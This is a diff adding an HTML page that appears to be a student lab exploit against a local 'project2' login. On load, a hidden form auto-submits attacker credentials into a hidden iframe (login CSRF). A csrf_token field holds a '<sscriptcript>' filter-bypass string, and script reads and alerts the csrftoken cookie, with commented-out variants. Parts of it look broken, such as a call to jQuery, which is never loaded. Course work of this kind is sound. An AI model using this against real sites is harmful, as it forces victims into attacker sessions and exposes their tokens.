@@ -1,0 +1,72 @@
+
+
+<html>
+
+    <iframe name="myiframe", style="display: none"></iframe>
+
+    <form id="thesame", target="myiframe", action="http://localhost/project2/login", method="post", style="display: none">
+        <input name="username" value="attacker">
+        <input name="password" value="l33th4x">
+        <input name="csrfdefense" value="1">
+        <input name="xssdefense" value="0">
+        
+        <input type="hidden" name="csrf_token" value= "<sscriptcript> getCookie(); </sscriptcript>">
+        
+    </form>
+    <script>
+
+        function getCookie() {
+            var cookieValue = null;
+            if (document.cookie && document.cookie != '') {
+                var cookies = document.cookie.split(';');
+                for (var i = 0; i < cookies.length; i++) {
+                    var cookie = jQuery.trim(cookies[i]);
+                    if (cookie.substring(0, 10) == ('csrftoken' + '=')) {
+                        cookieValue = decodeURIComponent(cookie.substring(10));
+                        break;
+                    }
+                }
+            }
+            alert(cookieValue);
+            return cookieValue;
+        }
+        /*
+        function getCookie() {
+            var cname= "csrf_token";
+            var name = cname + "=";
+            var decodedCookie = decodeURIComponent(document.cookie);
+            var ca = decodedCookie.split(';');
+            for(var i = 0; i <ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    alert(c.substring(name.length, c.length));
+                    return c.substring(name.length, c.length);
+                }
+            }
+                 return "";
+        }
+        */
+       /*
+        function getCookie() {
+            var name="csrf_token";
+            var c_string= document.cookie.split(';');
+            for(i=0; i<c_string.length; i++){
+                if(c_string[i].includes(name)){
+                    var val= c_string[i].split('=')[1];
+                    alert(val);
+                    return val;
+                    
+                }
+            }
+        }
+        */
+        alert(getCookie());
+        document.getElementById("thesame").submit();
+
+    </script>
+
+
+</html> 
